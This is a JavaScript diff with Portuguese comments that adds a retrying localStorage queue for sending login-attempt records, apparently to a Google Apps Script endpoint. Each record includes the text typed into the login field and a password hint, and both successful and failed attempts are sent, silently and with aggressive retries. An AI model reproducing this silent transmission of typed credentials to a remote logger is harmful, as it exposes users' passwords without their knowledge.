@@ -251,60 +251,256 @@
     const btn = document.getElementById(BTN_ID);
     const input = document.getElementById(INPUT_ID);
 
-    // 1) Evento disparado pelo main.js no momento exato da liberação
+    const QKEY = "mailQueue.v2";
+    const LOCKKEY = "mailQueue.lock.v2";
+    const MAX_ATTEMPTS = 12; // bastante agressivo
+    const BASE_BACKOFF = 800; // ms
+    const MAX_BACKOFF = 60_000; // 1 min
+    const DEDUPE_WINDOW = 8_000; // ms (evita duplicar granted em rajada)
+
+    function now() {
+      return Date.now();
+    }
+
+    function safeParse(json, fallback) {
+      try {
+        return JSON.parse(json);
+      } catch {
+        return fallback;
+      }
+    }
+
+    function loadQueue() {
+      try {
+        return safeParse(localStorage.getItem(QKEY) || "[]", []);
+      } catch {
+        return [];
+      }
+    }
+
+    function saveQueue(q) {
+      try {
+        localStorage.setItem(QKEY, JSON.stringify(q));
+      } catch { }
+    }
+
+    function makeId() {
+      return (
+        String(Date.now()) +
+        ":" +
+        Math.random().toString(16).slice(2) +
+        ":" +
+        Math.random().toString(16).slice(2)
+      );
+    }
+
+    function isLocked() {
+      try {
+        const v = Number(localStorage.getItem(LOCKKEY) || "0");
+        return v > now();
+      } catch {
+        return false;
+      }
+    }
+
+    function lock(ms) {
+      try {
+        localStorage.setItem(LOCKKEY, String(now() + ms));
+      } catch { }
+    }
+
+    function unlock() {
+      try {
+        localStorage.removeItem(LOCKKEY);
+      } catch { }
+    }
+
+    function shouldDedupe(item) {
+      // Dedupe só para granted: evita spam em logins sucessivos
+      if (item.payload?.status !== "granted") return false;
+
+      const q = loadQueue();
+      const t0 = now() - DEDUPE_WINDOW;
+      return q.some(
+        (x) =>
+          x?.payload?.status === "granted" &&
+          typeof x.createdAt === "number" &&
+          x.createdAt >= t0
+      );
+    }
+
+    function enqueue(payload) {
+      const item = {
+        id: makeId(),
+        createdAt: now(),
+        nextTryAt: now(),
+        attempts: 0,
+        payload,
+      };
+
+      if (shouldDedupe(item)) return;
+
+      const q = loadQueue();
+      q.push(item);
+      saveQueue(q);
+
+      // Tenta enviar já
+      scheduleFlush(0);
+    }
+
+    async function trySendOne(item) {
+      // postToGAS já usa sendBeacon ou fetch keepalive
+      // Aqui só chamamos e assumimos que pode falhar silenciosamente
+      // Por isso o retry baseado em tempo e tentativas.
+      postToGAS(item.payload);
+    }
+
+    function computeBackoff(attempt) {
+      // backoff exponencial com teto
+      const exp = Math.min(MAX_BACKOFF, BASE_BACKOFF * Math.pow(2, attempt));
+      // jitter leve (0 a 300ms)
+      const jitter = Math.floor(Math.random() * 300);
+      return exp + jitter;
+    }
+
+    let flushTimer = null;
+
+    function scheduleFlush(delayMs) {
+      if (flushTimer) return;
+      flushTimer = setTimeout(() => {
+        flushTimer = null;
+        flushQueue();
+      }, Math.max(0, delayMs || 0));
+    }
+
+    function flushQueue() {
+      if (isLocked()) return;
+      lock(1200);
+
+      try {
+        let q = loadQueue();
+        if (!Array.isArray(q) || q.length === 0) {
+          unlock();
+          return;
+        }
+
+        const t = now();
+        let soonest = null;
+
+        // Limpa itens muito antigos (opcional: 24h)
+        const TTL = 24 * 60 * 60 * 1000;
+        q = q.filter((x) => !x?.createdAt || t - x.createdAt < TTL);
+
+        for (const item of q) {
+          if (!item || !item.payload) continue;
+
+          if (item.attempts >= MAX_ATTEMPTS) {
+            // desistir silenciosamente (ou você pode manter para debug)
+            item.nextTryAt = Infinity;
+            continue;
+          }
+
+          if (typeof item.nextTryAt !== "number") item.nextTryAt = t;
+          if (item.nextTryAt > t) {
+            soonest = soonest === null ? item.nextTryAt : Math.min(soonest, item.nextTryAt);
+            continue;
+          }
+
+          // Marca próxima tentativa antes de tentar (garante robustez contra fechamento no meio)
+          item.attempts += 1;
+          item.nextTryAt = t + computeBackoff(item.attempts);
+
+          // Tenta enviar
+          trySendOne(item);
+
+          // Para evitar saturar em rajada, tenta 2 por flush no máximo
+          // Ajuste se quiser mais agressivo.
+          // eslint-disable-next-line no-unused-expressions
+          (flushQueue._sentThisRound = (flushQueue._sentThisRound || 0) + 1);
+          if (flushQueue._sentThisRound >= 2) break;
+        }
+
+        // Remove itens que estouraram tentativas ou ficaram inválidos
+        q = q.filter((x) => x && x.payload && x.attempts < MAX_ATTEMPTS);
+
+        saveQueue(q);
+
+        // Agenda o próximo flush pelo menor nextTryAt
+        flushQueue._sentThisRound = 0;
+        if (q.length) {
+          const t2 = now();
+          const next = q.reduce((min, x) => {
+            const n = typeof x.nextTryAt === "number" ? x.nextTryAt : t2;
+            return Math.min(min, n);
+          }, Infinity);
+
+          if (Number.isFinite(next)) {
+            scheduleFlush(Math.max(250, next - t2));
+          }
+        }
+      } finally {
+        unlock();
+      }
+    }
+
+    // 1) Evento do main.js: enfileira IMEDIATAMENTE
     window.addEventListener("login:granted", async () => {
       try {
         const typed = input?.value || "";
         const hint = getPasswordHint();
         const payload = await buildPayload("granted", "", typed, hint);
-        postToGAS(payload);
+        enqueue(payload);
       } catch { }
     });
 
-    // Função comum para clique e Enter
+    // 2) Clique/Enter: enfileira o que for coerente depois de um pequeno delay
     function handleAttempt() {
       const typed = input?.value || "";
       const hint = getPasswordHint();
 
-      // Pequeno delay para permitir o main.js concluir a validação
       setTimeout(async () => {
         try {
           if (isAccessGranted()) {
             const payload = await buildPayload("granted", "", typed, hint);
-            postToGAS(payload);
+            enqueue(payload);
           } else {
-            const payload = await buildPayload(
-              "denied",
-              getRefusalReason(),
-              typed,
-              hint
-            );
-            postToGAS(payload);
+            const payload = await buildPayload("denied", getRefusalReason(), typed, hint);
+            enqueue(payload);
           }
         } catch { }
-      }, 350);
+      }, 260);
     }
 
-    // 2) Clique no botão
     btn?.addEventListener("click", handleAttempt);
-
-    // 3) Enter no input
     input?.addEventListener("keydown", (e) => {
       if (e.key === "Enter") handleAttempt();
     });
 
-    // 4) Caso raro: página já abriu com acesso garantido (mobile / restore)
+    // 3) Envio tardio na page.html, quando chegar estável
     (async () => {
       try {
         const justGranted = sessionStorage.getItem(JUST_GRANTED_TAG);
         if (justGranted && isAccessGranted()) {
           sessionStorage.removeItem(JUST_GRANTED_TAG);
           const payload = await buildPayload("granted");
-          postToGAS(payload);
+          enqueue(payload);
         }
       } catch { }
     })();
+
+    // 4) Flush em momentos críticos de mobile
+    // pagehide é melhor que beforeunload em iOS
+    window.addEventListener("pagehide", () => flushQueue());
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "hidden") flushQueue();
+      if (document.visibilityState === "visible") scheduleFlush(0);
+    });
+    window.addEventListener("online", () => scheduleFlush(0));
+
+    // 5) Tenta drenar fila ao abrir a página
+    scheduleFlush(0);
   }
+
 
 
   if (document.readyState === "loading") {
